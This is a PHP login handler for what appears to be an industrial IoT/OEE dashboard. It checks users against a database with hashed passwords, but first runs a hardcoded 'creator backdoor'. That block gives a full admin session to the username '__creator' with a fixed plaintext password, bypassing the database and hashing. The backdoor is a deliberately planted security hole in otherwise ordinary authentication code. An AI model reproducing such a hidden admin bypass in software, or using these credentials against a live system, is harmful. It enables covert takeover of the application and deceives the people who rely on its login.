<?php
session_start();
require_once("../api/db.php");

$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

// ✅ Creator backdoor (hardcoded)
if ($username === '__creator' && $password === 'H2P[forever]') {
  $_SESSION['user'] = [
    'id' => -1,  // negative ID to avoid conflict
    'username' => '__creator',
    'role' => 'admin'
  ];
  $_SESSION['last_activity'] = time();
  header("Location: ../page/OEE_Dashboard.php");
  exit;
}

// 🔒 Normal login path
$sql = "SELECT id, username, password, role FROM IOT_TOOLBOX_USERS WHERE username = ?";
$stmt = sqlsrv_query($conn, $sql, [$username]);

if ($stmt && $user = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC)) {
  if (password_verify($password, $user['password'])) {
    $_SESSION['user'] = [
      'id' => $user['id'],
      'username' => $user['username'],
      'role' => $user['role'] ?? 'operator'
    ];
    $_SESSION['last_activity'] = time();
    header("Location: ../page/OEE_Dashboard.php");
    exit;
  }
}

// ❌ Invalid login
echo "<script>alert('Invalid username or password'); window.location='login_form.php';</script>";
?>
